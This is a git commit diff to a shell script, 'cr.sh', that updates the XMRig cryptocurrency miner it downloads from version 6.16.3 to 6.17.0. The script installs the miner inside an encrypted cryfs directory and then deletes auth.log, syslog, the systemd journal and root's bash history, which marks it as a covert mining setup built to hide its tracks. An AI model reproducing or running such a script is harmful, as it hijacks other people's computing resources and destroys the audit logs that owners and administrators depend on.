582f7b84562f3354c1fba80a6071ba9c94dec282
crfast <96539684+crfast@users.noreply.github.com>
2022-04-24 16:02:55 +0400

    Update cr.sh

--- cr.sh
+++ cr.sh
@@ -9,11 +9,11 @@ ecryptfs-setup-swap -f
 echo "#!/bin/bash
 sudo mkdir /home/fast/cr /home/fast/crd
 sudo cryfs /home/fast/cr /home/fast/crd
-sudo wget https://github.com/xmrig/xmrig/releases/download/v6.16.3/xmrig-6.16.3-focal-x64.tar.gz -O /home/fast/crd/xm.tar.gz
+sudo wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-focal-x64.tar.gz -O /home/fast/crd/xm.tar.gz
 sudo tar -xvzf /home/fast/crd/xm.tar.gz
-sudo cp /home/fast/xmrig-6.16.3/config.json /home/fast/crd/config.json
-sudo cp /home/fast/xmrig-6.16.3/xmrig /home/fast/crd/xmrig
-sudo rm -rf /home/fast/xmrig-6.16.3
+sudo cp /home/fast/xmrig-6.17.0/config.json /home/fast/crd/config.json
+sudo cp /home/fast/xmrig-6.17.0/xmrig /home/fast/crd/xmrig
+sudo rm -rf /home/fast/xmrig-6.17.0
 sudo rm -rf /home/fast/crd/xm.tar.gz
 sudo rm -rf /var/log/auth.log /var/log/syslog.log /var/log/journal/* /root/.bash_history
 sudo rm -rf /etc/profile.d/crar.sh
